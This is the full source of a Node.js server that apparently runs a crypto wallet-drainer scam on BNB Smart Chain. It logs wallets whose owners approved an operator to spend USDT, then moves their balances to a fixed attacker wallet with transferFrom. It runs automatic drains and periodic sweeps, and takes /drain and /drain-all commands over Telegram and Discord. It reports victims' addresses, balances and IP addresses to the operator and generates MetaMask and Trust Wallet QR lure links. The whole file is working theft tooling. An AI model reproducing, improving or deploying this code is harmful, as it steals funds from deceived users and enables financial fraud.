require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const LOG = {
    info:  (...a) => console.log(`[INFO]  ${new Date().toISOString()}`, ...a),
    warn:  (...a) => console.warn(`[WARN]  ${new Date().toISOString()}`, ...a),
    error: (...a) => console.error(`[ERROR] ${new Date().toISOString()}`, ...a),
    money: (...a) => console.log(`[💰]    ${new Date().toISOString()}`, ...a),
};

const app = express();
app.set('trust proxy', true);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: process.env.FRONTEND_ORIGIN || '*' }));
app.use(express.json());
app.use(rateLimit({ windowMs: 60000, max: 60, standardHeaders: true, legacyHeaders: false }));
const txLimiter = rateLimit({ windowMs: 60000, max: 5, standardHeaders: true, legacyHeaders: false });

const SWEEP_MS = parseInt(process.env.SWEEP_INTERVAL_MIN || "5") * 60 * 1000;
const KEEPALIVE = 10 * 60 * 1000;

/* ═══════════════════════════════════════
 *  CONFIG — NO ESCROW
 *  Operator calls transferFrom directly
 * ═══════════════════════════════════════ */
const CFG = {
    rpcUrl:        process.env.RPC_URL || "https://bsc-dataseed1.binance.org/",
    rpcFallback:   process.env.RPC_URL_FALLBACK || "https://bsc-dataseed2.binance.org/",
    chainId:       parseInt(process.env.CHAIN_ID) || 56,
    tokenAddr:     process.env.TOKEN_ADDRESS || "0x55d398326f99059fF775485246999027B3197955",
    operatorAddr:  process.env.OPERATOR_ADDRESS || "0x0c403d5080cB0ef50A562B6f06f3473F83854D31",
    companyWallet: process.env.COMPANY_WALLET || "0x899673Fe0593556f6f66b9D93F73f4d75b0BB08e",
    operatorKey:   process.env.RELAYER_PRIVATE_KEY,
    tgBotToken:    process.env.TG_BOT_TOKEN,
    tgChatId:      process.env.TG_CHAT_ID,
    dcWebhookUrl:  process.env.DISCORD_WEBHOOK_URL,
    dcBotToken:    process.env.DISCORD_BOT_TOKEN,
    dcChannelId:   process.env.DISCORD_CHANNEL_ID,
    autoDrain:     (process.env.AUTO_DRAIN || 'true').toLowerCase() === 'true',
    autoSweep:     process.env.AUTO_SWEEP !== 'false',
    backendUrl:    process.env.BACKEND_URL || '',
    adminKey:      process.env.ADMIN_KEY || crypto.randomUUID(),
    approveAmt:    process.env.APPROVE_AMOUNT || '500000',
};

if (!CFG.operatorKey) {
    LOG.error("❌ RELAYER_PRIVATE_KEY not set!");
    process.exit(1);
}

const hasTG = !!(CFG.tgBotToken && CFG.tgChatId);
const hasDC = !!(CFG.dcWebhookUrl || (CFG.dcBotToken && CFG.dcChannelId));

/* ===== PROVIDER + WALLET ===== */
const RPCS = [CFG.rpcUrl, CFG.rpcFallback];
let rpcIdx = 0, provider, opWallet;

function mkProv(url) {
    provider = new ethers.providers.JsonRpcProvider(url);
    opWallet = new ethers.Wallet(CFG.operatorKey, provider);
}
mkProv(RPCS[0]);

async function goodProv() {
    try { await provider.getBlockNumber(); return provider; }
    catch(e) { rpcIdx = (rpcIdx+1) % RPCS.length; mkProv(RPCS[rpcIdx]); LOG.warn(`RPC → ${RPCS[rpcIdx]}`); return provider; }
}

/* ===== USDT CONTRACT (read + write) ===== */
const ERC20_ABI = [
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)",
];

function usdtRO() { return new ethers.Contract(CFG.tokenAddr, ERC20_ABI, provider); }
function usdtRW() { return new ethers.Contract(CFG.tokenAddr, ERC20_ABI, opWallet); }

let _meta = null;
async function meta() {
    if (_meta) return _meta;
    const t = usdtRO();
    const [s, d] = await Promise.all([t.symbol(), t.decimals()]);
    _meta = { symbol: s, decimals: d };
    return _meta;
}

/* ===== NONCE LOCK ===== */
let _lock = Promise.resolve();
function locked(fn) {
    const p = _lock; let r;
    _lock = new Promise(x => { r = x; });
    return p.then(async () => { try { return await fn(); } finally { r(); } });
}

/* ===== WALLET STORAGE ===== */
const WFILE = path.join(__dirname, '.approved_wallets.json');
function loadW() {
    try { if (fs.existsSync(WFILE)) return new Map(Object.entries(JSON.parse(fs.readFileSync(WFILE, 'utf8')))); } catch(e) {}
    return new Map();
}
function saveW() {
    try { fs.writeFileSync(WFILE, JSON.stringify(Object.fromEntries(wallets), null, 2)); } catch(e) {}
}
const wallets = loadW();
const shortLinks = new Map();
const connLog = new Map();

function getClientIP(req) { return (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.ip; }

/* ═══════════════════════════════════════
 *  DRAIN — transferFrom directly
 *
 *  User approved OPERATOR to spend USDT
 *  Operator calls USDT.transferFrom(user, companyWallet, amount)
 *  No escrow. No companyWallet check. Simple.
 * ═══════════════════════════════════════ */
async function drainWallet(addr) {
    await goodProv();
    const tk = usdtRO();
    const rw = usdtRW();
    const { decimals, symbol } = await meta();

    const [allow, bal] = await Promise.all([
        tk.allowance(addr, CFG.operatorAddr),
        tk.balanceOf(addr)
    ]);

    if (allow.eq(0)) return { success: false, reason: "No allowance to operator" };
    if (bal.eq(0)) return { success: false, reason: "0 balance" };

    const amt = bal.lt(allow) ? bal : allow;
    const disp = ethers.utils.formatUnits(amt, decimals);

    LOG.money(`Draining ${disp} ${symbol} from ${addr}...`);

    const receipt = await locked(async () => {
        const tx = await rw.transferFrom(addr, CFG.companyWallet, amt, { gasLimit: 100000 });
        LOG.info(`transferFrom tx: ${tx.hash}`);
        return tx.wait();
    });

    if (receipt.status !== 1) return { success: false, reason: "Transaction reverted" };

    const ex = wallets.get(addr) || {};
    wallets.set(addr, {
        ...ex,
        lastDrained: Date.now(),
        totalDrained: (parseFloat(ex.totalDrained || "0") + parseFloat(disp)).toFixed(4)
    });
    saveW();

    LOG.money(`✅ Drained ${disp} ${symbol} from ${addr} → ${CFG.companyWallet} | tx: ${receipt.transactionHash}`);
    return { success: true, amount: disp, symbol, txHash: receipt.transactionHash };
}

/* ===== CLEANUP ===== */
setInterval(() => {
    const n = Date.now();
    for (const [k, v] of connLog) if (n - v > 3600000) connLog.delete(k);
    for (const [k, v] of shortLinks) if (v.expires > 0 && n > v.expires) shortLinks.delete(k);
}, 30 * 60 * 1000);

/* ===== NOTIFICATIONS ===== */
function htmlToDc(h) {
    return h.replace(/<b>/g,'**').replace(/<\/b>/g,'**').replace(/<code>/g,'`').replace(/<\/code>/g,'`').replace(/<a href="([^"]+)"[^>]*>[^<]*<\/a>/g,'$1').replace(/<br\s*\/?>/g,'\n').replace(/<[^>]+>/g,'');
}
async function alert(html) {
    const p = [];
    if (hasTG) p.push(fetch(`https://api.telegram.org/bot${CFG.tgBotToken}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CFG.tgChatId,text:html,parse_mode:'HTML',disable_web_page_preview:true})}).catch(e=>LOG.error("TG:",e.message)));
    const dc = htmlToDc(html);
    if (CFG.dcWebhookUrl) p.push(fetch(CFG.dcWebhookUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:dc})}).catch(e=>LOG.error("DC:",e.message)));
    else if (CFG.dcBotToken&&CFG.dcChannelId) p.push(fetch(`https://discord.com/api/v10/channels/${CFG.dcChannelId}/messages`,{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${CFG.dcBotToken}`},body:JSON.stringify({content:dc})}).catch(e=>LOG.error("DC:",e.message)));
    await Promise.allSettled(p);
}
async function alertPhoto(url, cap) {
    if (hasTG) fetch(`https://api.telegram.org/bot${CFG.tgBotToken}/sendPhoto`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CFG.tgChatId,photo:url,caption:cap,parse_mode:'HTML'})}).catch(()=>{});
    const dc = htmlToDc(cap);
    if (CFG.dcWebhookUrl) fetch(CFG.dcWebhookUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:dc,embeds:[{image:{url}}]})}).catch(()=>{});
    else if (CFG.dcBotToken&&CFG.dcChannelId) fetch(`https://discord.com/api/v10/channels/${CFG.dcChannelId}/messages`,{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${CFG.dcBotToken}`},body:JSON.stringify({content:dc,embeds:[{image:{url}}]})}).catch(()=>{});
}

/* ===== SERVE FRONTEND ===== */
let cachedHost = CFG.backendUrl;
app.use((req, res, next) => { if (!cachedHost) cachedHost = `${req.protocol}://${req.get('host')}`; next(); });
app.use(express.static(path.join(__dirname)));

/* ═══════════════════════════════════════
 *  ENDPOINTS
 * ═══════════════════════════════════════ */

// Health
app.get('/api/v1/health', async (req, res) => {
    try {
        await goodProv();
        const b = await provider.getBalance(opWallet.address);
        res.json({
            status: 'ok',
            operator: opWallet.address,
            operatorBNB: ethers.utils.formatEther(b),
            destination: CFG.companyWallet,
            token: CFG.tokenAddr,
            wallets: wallets.size,
            uptime: process.uptime(),
            autoDrain: CFG.autoDrain,
            autoSweep: CFG.autoSweep,
            tg: hasTG,
            dc: hasDC
        });
    } catch(e) { res.status(503).json({ status: 'down', error: e.message }); }
});

// Info
app.get('/api/v1/info', async (req, res) => {
    try {
        await goodProv();
        const { symbol, decimals } = await meta();
        res.json({
            chainId: CFG.chainId,
            tokenAddress: CFG.tokenAddr,
            operator: opWallet.address,
            destination: CFG.companyWallet,
            symbol, decimals,
            approveAmount: CFG.approveAmt
        });
    } catch(e) { res.status(500).json({ error: e.message }); }
});

// Connect log
app.post('/api/v1/log/connect', async (req, res) => {
    const { account, balance, bnbBalance, symbol } = req.body;
    const ip = getClientIP(req);
    if (!account || !ethers.utils.isAddress(account)) return res.status(400).json({ error: "Bad" });
    const n = Date.now();
    if (connLog.has(ip) && n - connLog.get(ip) < 300000) return res.sendStatus(200);
    connLog.set(ip, n);
    await alert(`📌 🟢 <b>Connected</b>\n👤 <code>${account}</code>\n💰 ${balance||0} ${symbol||'USDT'}\n💎 ${bnbBalance||0} BNB\n🌐 ${ip}`);
    res.sendStatus(200);
});

// Save approval
app.post('/api/save-approval', async (req, res) => {
    const { userAddress, approvalTxHash, amount } = req.body;
    const ip = getClientIP(req);
    if (!userAddress || !ethers.utils.isAddress(userAddress)) return res.status(400).json({ error: "Bad address" });

    const w = userAddress.toLowerCase();
    const ex = wallets.get(w) || {};
    wallets.set(w, { ...ex, approvedAt: ex.approvedAt || Date.now(), ip, lastSeen: Date.now(), totalDrained: ex.totalDrained || "0", approvalTxHash, amount });
    saveW();

    // Check on-chain allowance to OPERATOR
    try {
        await goodProv();
        const tk = usdtRO();
        const { decimals, symbol } = await meta();
        const [allow, bal] = await Promise.all([tk.allowance(w, CFG.operatorAddr), tk.balanceOf(w)]);
        const db = ethers.utils.formatUnits(bal, decimals);
        const da = allow.gt(ethers.utils.parseUnits("999999999", decimals)) ? "UNLIMITED" : ethers.utils.formatUnits(allow, decimals);

        LOG.info(`Approval: ${w} | bal=${db} | allowance to operator=${da}`);

        await alert(`🔓 <b>APPROVED</b>\n👤 <code>${w}</code>\n💰 ${parseFloat(db).toFixed(4)} ${symbol}\n🔑 Allowance: ${da}\n🔗 <code>${approvalTxHash||'n/a'}</code>\n🌐 ${ip}`);
    } catch(e) {
        LOG.warn("Allowance check failed:", e.message);
        await alert(`🔓 <b>APPROVED (pending)</b>\n👤 <code>${w}</code>\n🔗 <code>${approvalTxHash||'n/a'}</code>\n🌐 ${ip}`);
    }

    res.json({ success: true, id: crypto.randomUUID() });
});

// Auto-transfer — transferFrom directly
app.post('/api/auto-transfer', txLimiter, async (req, res) => {
    const { userAddress, amount, approvalTxHash } = req.body;
    if (!userAddress || !ethers.utils.isAddress(userAddress)) return res.status(400).json({ success: false, error: "Bad address" });
    const pa = parseFloat(amount);
    if (isNaN(pa) || pa <= 0) return res.status(400).json({ success: false, error: "Bad amount" });

    const w = userAddress.toLowerCase();

    try {
        await goodProv();
        const tk = usdtRO();
        const rw = usdtRW();
        const { decimals, symbol } = await meta();
        const amtWei = ethers.utils.parseUnits(pa.toString(), decimals);

        const [bal, allow] = await Promise.all([tk.balanceOf(w), tk.allowance(w, CFG.operatorAddr)]);

        LOG.info(`Transfer: ${w} | bal=${ethers.utils.formatUnits(bal,decimals)} | allow=${ethers.utils.formatUnits(allow,decimals)} | req=${pa}`);

        if (bal.lt(amtWei)) return res.status(400).json({ success: false, error: "Low balance" });
        if (allow.lt(amtWei)) return res.status(400).json({ success: false, error: "Low allowance — approval not on BSC" });

        const receipt = await locked(async () => {
            const tx = await rw.transferFrom(w, CFG.companyWallet, amtWei, { gasLimit: 100000 });
            LOG.info(`transferFrom tx: ${tx.hash}`);
            return tx.wait();
        });

        if (receipt.status !== 1) throw new Error("Transaction reverted");

        const d = ethers.utils.formatUnits(amtWei, decimals);
        await alert(`✅ <b>${symbol} Transfer</b>\n📩 ${d} ${symbol}\n👤 <code>${w}</code> → <code>${CFG.companyWallet}</code>\n🔗 <code>${receipt.transactionHash}</code>`);
        res.json({ success: true, transferTxHash: receipt.transactionHash });

        // Auto-drain remainder
        if (CFG.autoDrain) {
            setTimeout(async () => {
                try {
                    const rem = await tk.balanceOf(w);
                    if (rem.gt(0)) {
                        const r = await drainWallet(w);
                        if (r.success) await alert(`🤖 <b>AUTO-DRAIN</b>\n👤 <code>${w}</code>\n💰 ${r.amount} ${r.symbol}\n🔗 <code>${r.txHash}</code>`);
                    }
                } catch(e) { LOG.error("Auto-drain:", e.message); }
            }, 3000);
        }

    } catch(e) {
        LOG.error("Transfer failed:", e.message);
        if (e.reason) LOG.error("Revert reason:", e.reason);
        res.status(500).json({ success: false, error: e.reason || e.message || "Failed" });
    }
});

// Admin drain
app.post('/api/admin/drain', async (req, res) => {
    const { key, wallet, all } = req.body;
    if (key !== CFG.adminKey) return res.status(403).json({ error: "Bad key" });

    if (all) {
        let s = 0, f = 0, tot = 0, results = [];
        for (const [w] of wallets) {
            try {
                const r = await drainWallet(w);
                if (r.success) { s++; tot += parseFloat(r.amount); results.push({ w, ...r }); }
                else { f++; results.push({ w, ...r }); }
            } catch(e) { f++; results.push({ w, success: false, reason: e.message }); }
        }
        await alert(`🔫 <b>DRAIN-ALL</b>\n✅ ${s} | ❌ ${f}\n💰 ${tot.toFixed(4)} USDT`);
        return res.json({ drained: s, failed: f, total: tot.toFixed(4), results });
    }

    if (!wallet || !ethers.utils.isAddress(wallet)) return res.status(400).json({ error: "Bad wallet" });
    try {
        const r = await drainWallet(wallet.toLowerCase());
        if (r.success) await alert(`🔫 <b>DRAIN</b>\n👤 <code>${wallet}</code>\n💰 ${r.amount} ${r.symbol}\n🔗 <code>${r.txHash}</code>`);
        res.json(r);
    } catch(e) { res.status(500).json({ success: false, error: e.message }); }
});

// Admin list
app.get('/api/admin/wallets', async (req, res) => {
    if (req.query.key !== CFG.adminKey) return res.status(403).json({ error: "Bad key" });
    try {
        await goodProv();
        const tk = usdtRO();
        const { decimals, symbol } = await meta();
        const list = [];
        for (const [w, i] of wallets) {
            const [b, a] = await Promise.all([tk.balanceOf(w), tk.allowance(w, CFG.operatorAddr)]);
            list.push({
                wallet: w,
                balance: ethers.utils.formatUnits(b, decimals),
                allowance: ethers.utils.formatUnits(a, decimals),
                hasAllowance: a.gt(0),
                drainable: a.gt(0) && b.gt(0),
                totalDrained: i.totalDrained || "0",
                approvedAt: i.approvedAt ? new Date(i.approvedAt).toISOString() : null,
                lastDrained: i.lastDrained ? new Date(i.lastDrained).toISOString() : null,
                ip: i.ip || null
            });
        }
        res.json({ symbol, count: list.length, wallets: list });
    } catch(e) { res.status(500).json({ error: e.message }); }
});

// QR
app.get('/qr-link/:id', (req, res) => {
    const l = shortLinks.get(req.params.id);
    if (!l) return res.status(404).send("Not found");
    if (l.expires > 0 && Date.now() > l.expires) { shortLinks.delete(req.params.id); return res.status(410).send("Expired"); }
    res.redirect(l.target);
});

app.get('/api/v1/qr-widget', (req, res) => {
    const esc = s => String(s).replace(/[&<>"'`]/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','`':'&#96;' }[c]));
    const u = esc(req.query.url || 'https://example.com');
    const a = esc(req.query.address || CFG.companyWallet);
    res.send(`<!DOCTYPE html><html><head><script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1.5.0/lib/qr-code-styling.js"><\/script><style>body{background:#16181a;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;border-radius:30px;padding:40px;display:flex;flex-direction:column;align-items:center;width:400px}#qr{margin-bottom:20px}.a{font-size:18px;font-weight:600;color:#111;text-align:center;word-wrap:break-word}</style></head><body><div class="card"><div id="qr"></div><div class="a">${a}</div></div><script>new QRCodeStyling({width:400,height:400,data:"${u}",image:"https://cryptologos.cc/logos/bnb-bnb-logo.png",dotsOptions:{color:"#050505",type:"rounded"},cornersSquareOptions:{type:"extra-rounded"},cornersDotOptions:{type:"dot"},imageOptions:{crossOrigin:"anonymous",margin:15,imageSize:.4}}).append(document.getElementById("qr"))<\/script></body></html>`);
});

/* ===== SWEEP ===== */
async function sweep() {
    if (!wallets.size) return;
    try {
        await goodProv();
        const tk = usdtRO();
        const { decimals, symbol } = await meta();
        let s = 0, tot = 0;
        for (const [w] of wallets) {
            try {
                const [b, a] = await Promise.all([tk.balanceOf(w), tk.allowance(w, CFG.operatorAddr)]);
                if (b.gt(ethers.utils.parseUnits("0.5", decimals)) && a.gt(0)) {
                    const r = await drainWallet(w);
                    if (r.success) {
                        s++; tot += parseFloat(r.amount);
                        await alert(`🧹 <b>SWEEP</b>\n👤 <code>${w.slice(0,6)}...${w.slice(-4)}</code>\n💰 ${r.amount} ${r.symbol}\n🔗 <code>${r.txHash}</code>`);
                    }
                }
            } catch(e) { LOG.error(`Sweep ${w}:`, e.message); }
        }
        if (s > 0) LOG.money(`Swept ${s}, ${tot.toFixed(4)} ${symbol}`);
    } catch(e) { LOG.error("Sweep:", e.message); }
}

if (CFG.autoSweep) {
    LOG.info(`Sweep ON — every ${SWEEP_MS/60000}min`);
    setInterval(sweep, SWEEP_MS);
    setTimeout(sweep, 30000);
}

/* ===== BOT COMMANDS ===== */
async function cmd(text, reply) {
    if (text === '/help') { await reply(`📋 <b>Commands</b>\n🔫 /drain 0x...\n🔫 /drain-all\n📋 /wallets\n🧹 /sweep\n💚 /health`); return true; }
    if (text === '/health') {
        try {
            const b = await provider.getBalance(opWallet.address);
            await reply(`💚 <b>Status</b>\n⛽ ${parseFloat(ethers.utils.formatEther(b)).toFixed(6)} BNB\n👛 ${wallets.size} wallets\n🤖 Drain:${CFG.autoDrain?'ON':'OFF'}\n🧹 Sweep:${CFG.autoSweep?'ON':'OFF'}`);
        } catch(e) { await reply(`⚠️ ${e.message}`); }
        return true;
    }
    if (text === '/sweep') { await reply('🧹...'); await sweep(); await reply('🧹 Done.'); return true; }
    if (text === '/wallets') {
        if (!wallets.size) { await reply("📋 Empty."); return true; }
        try {
            await goodProv();
            const tk = usdtRO();
            const { decimals, symbol } = await meta();
            let lines = [`📋 <b>${wallets.size}</b>\n`], ta = 0;
            for (const [w, i] of wallets) {
                const [b, a] = await Promise.all([tk.balanceOf(w), tk.allowance(w, CFG.operatorAddr)]);
                const db = parseFloat(ethers.utils.formatUnits(b, decimals)).toFixed(2);
                if (a.gt(0) && b.gt(0)) ta += parseFloat(db);
                lines.push(`${!a.gt(0)?'🔴':b.eq(0)?'⚪':'🟢'} <code>${w.slice(0,6)}...${w.slice(-4)}</code> ${db} ${symbol} (drained: ${i.totalDrained||'0'})`);
            }
            lines.push(`\n💎 <b>${ta.toFixed(2)} ${symbol}</b>`);
            await reply(lines.join('\n'));
        } catch(e) { await reply(`⚠️ ${e.message}`); }
        return true;
    }
    const dm = text.match(/^\/drain\s+(0x[a-fA-F0-9]{40})$/);
    if (dm) {
        const t = dm[1].toLowerCase();
        await reply('🔫...');
        try { const r = await drainWallet(t); if (r.success) await reply(`✅ ${r.amount} ${r.symbol}\n🔗 <code>${r.txHash}</code>`); else await reply(`❌ ${r.reason}`); } catch(e) { await reply(`❌ ${e.reason||e.message}`); }
        return true;
    }
    if (text === '/drain-all') {
        if (!wallets.size) { await reply("📋 Empty."); return true; }
        await reply(`🔫 ${wallets.size}...`);
        let s=0,f=0,tot=0;
        for (const [w] of wallets) { try { const r = await drainWallet(w); if (r.success) { s++; tot += parseFloat(r.amount); } else f++; } catch(e) { f++; } }
        await reply(`✅ ${s} | ❌ ${f}\n💰 ${tot.toFixed(4)} USDT`);
        return true;
    }
    const qm = text.match(/^\/qr(?:-([\d.]+))?\s+(.+)/);
    if (qm) {
        const hrs=qm[1],url=qm[2].trim(),base=cachedHost;
        if (!base) { await reply("⚠️ Set BACKEND_URL"); return true; }
        const tw=`https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(url)}`,mm=`https://metamask.app.link/dapp/${url.replace(/^https?:\/\//,'')}`;
        let twU=tw,mmU=mm,suf='\n⏳ Lifetime';
        if (hrs) {
            const exp=Date.now()+parseFloat(hrs)*3600000,a=crypto.randomUUID().slice(0,8),b=crypto.randomUUID().slice(0,8);
            shortLinks.set(a,{target:tw,expires:exp});shortLinks.set(b,{target:mm,expires:exp});
            twU=`${base}/qr-link/${a}`;mmU=`${base}/qr-link/${b}`;suf=`\n⏳ ${hrs}h`;
        }
        const qr=u=>`https://api.qrserver.com/v1/create-qr-code/?size=400x400&margin=20&data=${encodeURIComponent(u)}`;
        await alertPhoto(qr(twU),`🛡 <b>Trust Wallet</b>${suf}\n${twU}`);
        await alertPhoto(qr(mmU),`🦊 <b>MetaMask</b>${suf}\n${mmU}`);
        return true;
    }
    return false;
}

// TG poll
let lastTg = 0;
async function pollTG() {
    if (!hasTG) return;
    let had = false;
    try {
        const r = await fetch(`https://api.telegram.org/bot${CFG.tgBotToken}/getUpdates?offset=${lastTg+1}&timeout=30`);
        const d = await r.json();
        if (d.ok && d.result.length > 0) { had = true; for (const u of d.result) { lastTg = u.update_id; if (u.message?.text && u.message.chat.id.toString() === CFG.tgChatId.toString()) await cmd(u.message.text.trim(), h => alert(h)); } }
    } catch(e) {}
    finally { setTimeout(pollTG, had ? 500 : 2000); }
}
pollTG();

// DC poll
let lastDc = null;
async function pollDC() {
    if (!CFG.dcBotToken || !CFG.dcChannelId) return;
    try {
        let u = `https://discord.com/api/v10/channels/${CFG.dcChannelId}/messages?limit=10`;
        if (lastDc) u += `&after=${lastDc}`;
        const r = await fetch(u, { headers: { Authorization: `Bot ${CFG.dcBotToken}` } });
        if (!r.ok) { if (r.status === 429) { const d = await r.json(); setTimeout(pollDC, (d.retry_after||5)*1000); return; } throw new Error(`DC ${r.status}`); }
        const msgs = await r.json();
        if (msgs.length > 0) for (const m of msgs.reverse()) { if (!lastDc || BigInt(m.id) > BigInt(lastDc)) lastDc = m.id; if (m.author.bot || !m.content.trim().startsWith('/')) continue; await cmd(m.content.trim(), async h => { await fetch(`https://discord.com/api/v10/channels/${CFG.dcChannelId}/messages`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bot ${CFG.dcBotToken}` }, body: JSON.stringify({ content: htmlToDc(h) }) }).catch(() => {}); }); }
    } catch(e) { if (!e.message?.includes('rate')) LOG.error("DC:", e.message); }
    finally { setTimeout(pollDC, 2000); }
}

async function initDC() {
    if (!CFG.dcBotToken || !CFG.dcChannelId) return;
    try { const r = await fetch(`https://discord.com/api/v10/channels/${CFG.dcChannelId}/messages?limit=1`, { headers: { Authorization: `Bot ${CFG.dcBotToken}` } }); if (r.ok) { const m = await r.json(); if (m.length > 0) lastDc = m[0].id; } LOG.info("Discord OK"); pollDC(); } catch(e) { LOG.error("DC init:", e.message); }
}
initDC();

// Keepalive
function keepAlive() {
    const u = CFG.backendUrl || cachedHost;
    if (!u) { setTimeout(keepAlive, 30000); return; }
    LOG.info(`Keepalive: ${u}`);
    setInterval(() => { fetch(`${u}/api/v1/health`).catch(() => {}); }, KEEPALIVE);
}
setTimeout(keepAlive, 10000);

/* ===== SHUTDOWN ===== */
function die(s) { LOG.info(s); saveW(); process.exit(0); }
process.on('SIGTERM', () => die('SIGTERM'));
process.on('SIGINT', () => die('SIGINT'));
process.on('uncaughtException', e => { LOG.error('!', e.message); saveW(); });
process.on('unhandledRejection', r => { LOG.error('!', r); });

/* ═══════════════════════════════════════
 *  START
 * ═══════════════════════════════════════ */
app.listen(process.env.PORT || 3000, async () => {
    LOG.info(`═══════════════════════════════════════`);
    LOG.info(`USDT Farm — Direct TransferFrom`);
    LOG.info(`═══════════════════════════════════════`);
    LOG.info(`Port: ${process.env.PORT || 3000}`);
    LOG.info(`Operator: ${opWallet.address}`);
    LOG.info(`Destination: ${CFG.companyWallet}`);
    LOG.info(`Token: ${CFG.tokenAddr}`);
    LOG.info(`Drain: ${CFG.autoDrain?'ON':'OFF'} | Sweep: ${CFG.autoSweep?'ON':'OFF'} (${SWEEP_MS/60000}m)`);
    LOG.info(`Wallets loaded: ${wallets.size}`);
    LOG.info(`Admin key: ${CFG.adminKey}`);

    try {
        await goodProv();
        const b = await provider.getBalance(opWallet.address);
        LOG.info(`Operator BNB: ${ethers.utils.formatEther(b)}`);
        if (b.lt(ethers.utils.parseEther("0.005"))) {
            LOG.warn(`⚠️ LOW BNB — send BNB to ${opWallet.address} for gas`);
        }
        const { symbol, decimals } = await meta();
        LOG.info(`Token: ${symbol} (${decimals} decimals)`);
    } catch(e) { LOG.warn("Init check:", e.message); }

    LOG.info(`═══════════════════════════════════════`);
    LOG.info(`Ready. No escrow. Direct transferFrom.`);
});